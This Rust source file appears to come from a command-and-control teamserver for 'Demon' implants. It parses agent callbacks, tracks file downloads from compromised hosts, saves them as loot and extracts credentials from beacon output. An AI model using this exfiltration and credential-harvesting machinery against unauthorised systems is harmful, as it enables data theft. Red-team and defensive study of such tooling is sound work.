use std::collections::BTreeMap;

use red_cell_common::demon::{DemonCallback, DemonCommand, DemonTransferCommand};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tracing::warn;

use crate::{AgentRegistry, Database, EventBus, PluginRuntime};

use super::filesystem::{
    download_complete_event, download_progress_event, parse_file_chunk, parse_file_close,
    parse_file_open_header, persist_download,
};
use super::{
    AgentResponseEntry, CallbackParser, CommandDispatchError, DownloadState, DownloadTracker,
    agent_response_event, broadcast_and_persist_agent_response, loot_context, loot_new_event,
    persist_credentials_from_output,
};

pub(super) async fn handle_transfer_callback(
    events: &EventBus,
    downloads: &DownloadTracker,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandTransfer));
    let subcommand = parser.read_u32("transfer subcommand")?;
    let subcommand = DemonTransferCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandTransfer),
            message: error.to_string(),
        }
    })?;

    match subcommand {
        DemonTransferCommand::List => {
            let active = downloads.active_for_agent(agent_id).await;
            let mut output = String::from(
                " File ID   Size      Progress  State     File\n -------   ----      --------  -----     ----\n",
            );
            let mut count = 0_usize;

            while !parser.is_empty() {
                let file_id = parser.read_u32("transfer list file id")?;
                let progress = u64::from(parser.read_u32("transfer list progress")?);
                let state = parser.read_u32("transfer list state")?;
                if let Some((_, download)) =
                    active.iter().find(|(active_file_id, _)| *active_file_id == file_id)
                {
                    output.push_str(&format!(
                        " {file_id:<7x}   {:<8}  {:<8}  {:<8}  {}\n",
                        byte_count(download.expected_size),
                        transfer_progress_text(progress, download.expected_size),
                        transfer_state_name(state),
                        download.remote_path
                    ));
                    count += 1;
                }
            }

            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandTransfer),
                request_id,
                "Info",
                &format!("List downloads [{count} current downloads]:"),
                Some(output.trim_end().to_owned()),
            )?);
        }
        DemonTransferCommand::Stop
        | DemonTransferCommand::Resume
        | DemonTransferCommand::Remove => {
            let found = parser.read_bool("transfer found")?;
            let file_id = parser.read_u32("transfer file id")?;
            let exists = downloads
                .active_for_agent(agent_id)
                .await
                .iter()
                .any(|(active_file_id, _)| *active_file_id == file_id);
            let (kind, message) = match subcommand {
                DemonTransferCommand::Stop => {
                    if found && exists {
                        ("Good", format!("Successfully found and stopped download: {file_id:x}"))
                    } else if found {
                        (
                            "Error",
                            format!("Couldn't stop download {file_id:x}: Download does not exist"),
                        )
                    } else {
                        ("Error", format!("Couldn't stop download {file_id:x}: FileID not found"))
                    }
                }
                DemonTransferCommand::Resume => {
                    if found && exists {
                        ("Good", format!("Successfully found and resumed download: {file_id:x}"))
                    } else if found {
                        (
                            "Error",
                            format!(
                                "Couldn't resume download {file_id:x}: Download does not exist"
                            ),
                        )
                    } else {
                        ("Error", format!("Couldn't resume download {file_id:x}: FileID not found"))
                    }
                }
                DemonTransferCommand::Remove => {
                    if found && exists {
                        if downloads.finish(agent_id, file_id).await.is_none() {
                            warn!(
                                agent_id = format_args!("{agent_id:08X}"),
                                file_id = format_args!("{file_id:08X}"),
                                "download remove: finish returned None — in-memory state was absent despite exists check"
                            );
                        }
                        ("Good", format!("Successfully found and removed download: {file_id:x}"))
                    } else if found {
                        (
                            "Error",
                            format!(
                                "Couldn't remove download {file_id:x}: Download does not exist"
                            ),
                        )
                    } else {
                        ("Error", format!("Couldn't remove download {file_id:x}: FileID not found"))
                    }
                }
                DemonTransferCommand::List => unreachable!(),
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandTransfer),
                request_id,
                kind,
                &message,
                None,
            )?);
        }
    }

    Ok(None)
}

pub(super) async fn handle_mem_file_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandMemFile));
    let mem_file_id = parser.read_u32("mem file id")?;
    let success = parser.read_bool("mem file success")?;
    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandMemFile),
        request_id,
        if success { "Good" } else { "Error" },
        &format!(
            "Memory file {:x} {}",
            mem_file_id,
            if success { "registered successfully" } else { "failed to register" }
        ),
        None,
    )?);
    Ok(None)
}

pub(super) async fn handle_package_dropped_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandPackageDropped));
    let package_length = parser.read_u32("dropped package length")?;
    let max_length = parser.read_u32("dropped package max length")?;
    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandPackageDropped),
        request_id,
        "Error",
        &format!(
            "A package was discarded by demon for being larger than PIPE_BUFFER_MAX ({package_length} > {max_length})"
        ),
        None,
    )?);
    Ok(None)
}

pub(super) async fn handle_beacon_output_callback(
    registry: &AgentRegistry,
    database: &Database,
    events: &EventBus,
    downloads: &DownloadTracker,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::BeaconOutput));
    let callback = parser.read_u32("beacon callback type")?;
    let context = loot_context(registry, agent_id, request_id).await;

    match DemonCallback::try_from(callback).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::BeaconOutput),
            message: error.to_string(),
        }
    })? {
        DemonCallback::Output => {
            let output = parser.read_string("beacon output text")?;
            if !output.is_empty() {
                broadcast_and_persist_agent_response(
                    database,
                    events,
                    AgentResponseEntry {
                        agent_id,
                        command_id: u32::from(DemonCommand::BeaconOutput),
                        request_id,
                        kind: "Good".to_owned(),
                        message: format!("Received Output [{} bytes]:", output.len()),
                        extra: BTreeMap::new(),
                        output: output.clone(),
                    },
                    &context,
                )
                .await?;
                persist_credentials_from_output(
                    database,
                    events,
                    plugins,
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    request_id,
                    &output,
                    &context,
                )
                .await?;
            }
        }
        DemonCallback::OutputOem | DemonCallback::OutputUtf8 => {
            let output = parser.read_utf16("beacon output utf16")?;
            if !output.is_empty() {
                broadcast_and_persist_agent_response(
                    database,
                    events,
                    AgentResponseEntry {
                        agent_id,
                        command_id: u32::from(DemonCommand::BeaconOutput),
                        request_id,
                        kind: "Good".to_owned(),
                        message: format!("Received Output [{} bytes]:", output.len()),
                        extra: BTreeMap::new(),
                        output: output.clone(),
                    },
                    &context,
                )
                .await?;
                persist_credentials_from_output(
                    database,
                    events,
                    plugins,
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    request_id,
                    &output,
                    &context,
                )
                .await?;
            }
        }
        DemonCallback::ErrorMessage => {
            let output = parser.read_string("beacon error text")?;
            if !output.is_empty() {
                broadcast_and_persist_agent_response(
                    database,
                    events,
                    AgentResponseEntry {
                        agent_id,
                        command_id: u32::from(DemonCommand::BeaconOutput),
                        request_id,
                        kind: "Error".to_owned(),
                        message: format!("Received Output [{} bytes]:", output.len()),
                        extra: BTreeMap::new(),
                        output: output.clone(),
                    },
                    &context,
                )
                .await?;
                persist_credentials_from_output(
                    database,
                    events,
                    plugins,
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    request_id,
                    &output,
                    &context,
                )
                .await?;
            }
        }
        DemonCallback::File => {
            let bytes = parser.read_bytes("beacon file open")?;
            let (file_id, expected_size, remote_path) =
                parse_file_open_header(u32::from(DemonCommand::BeaconOutput), &bytes)?;
            let started_at = OffsetDateTime::now_utc().format(&Rfc3339)?;
            downloads
                .start(
                    agent_id,
                    file_id,
                    DownloadState {
                        request_id,
                        remote_path: remote_path.clone(),
                        expected_size,
                        data: Vec::new(),
                        started_at,
                    },
                )
                .await;
            events.broadcast(download_progress_event(
                agent_id,
                u32::from(DemonCommand::BeaconOutput),
                request_id,
                file_id,
                &remote_path,
                0,
                expected_size,
                "Started",
            )?);
        }
        DemonCallback::FileWrite => {
            let bytes = parser.read_bytes("beacon file write")?;
            let (file_id, chunk) = parse_file_chunk(u32::from(DemonCommand::BeaconOutput), &bytes)?;
            let state = downloads.append(agent_id, file_id, &chunk).await?;
            events.broadcast(download_progress_event(
                agent_id,
                u32::from(DemonCommand::BeaconOutput),
                state.request_id,
                file_id,
                &state.remote_path,
                u64::try_from(state.data.len()).unwrap_or_default(),
                state.expected_size,
                "InProgress",
            )?);
        }
        DemonCallback::FileClose => {
            let bytes = parser.read_bytes("beacon file close")?;
            let file_id = parse_file_close(u32::from(DemonCommand::BeaconOutput), &bytes)?;
            if let Some(state) = downloads.finish(agent_id, file_id).await {
                let record =
                    persist_download(database, agent_id, file_id, &state, &context).await?;
                events.broadcast(loot_new_event(
                    &record,
                    u32::from(DemonCommand::BeaconOutput),
                    state.request_id,
                    &context,
                )?);
                events.broadcast(download_complete_event(
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    state.request_id,
                    file_id,
                    &state,
                )?);
                if let Some(plugins) = plugins
                    && let Err(error) = plugins.emit_loot_captured(&record).await
                {
                    warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to emit python loot_captured event");
                }
            }
        }
    }

    Ok(None)
}

pub(super) fn transfer_progress_text(progress: u64, total: u64) -> String {
    if total == 0 {
        return "0.00%".to_owned();
    }

    format!("{:.2}%", (progress as f64 / total as f64) * 100.0)
}

pub(super) fn transfer_state_name(state: u32) -> &'static str {
    match state {
        1 => "Running",
        2 => "Stopped",
        3 => "Removed",
        _ => "Unknown",
    }
}

pub(super) fn byte_count(size: u64) -> String {
    const UNITS: [&str; 5] = ["B", "kB", "MB", "GB", "TB"];
    let mut value = size as f64;
    let mut unit = 0usize;
    while value >= 1000.0 && unit < UNITS.len() - 1 {
        value /= 1000.0;
        unit += 1;
    }
    if unit == 0 {
        format!("{size} {}", UNITS[unit])
    } else {
        format!("{value:.2} {}", UNITS[unit])
    }
}
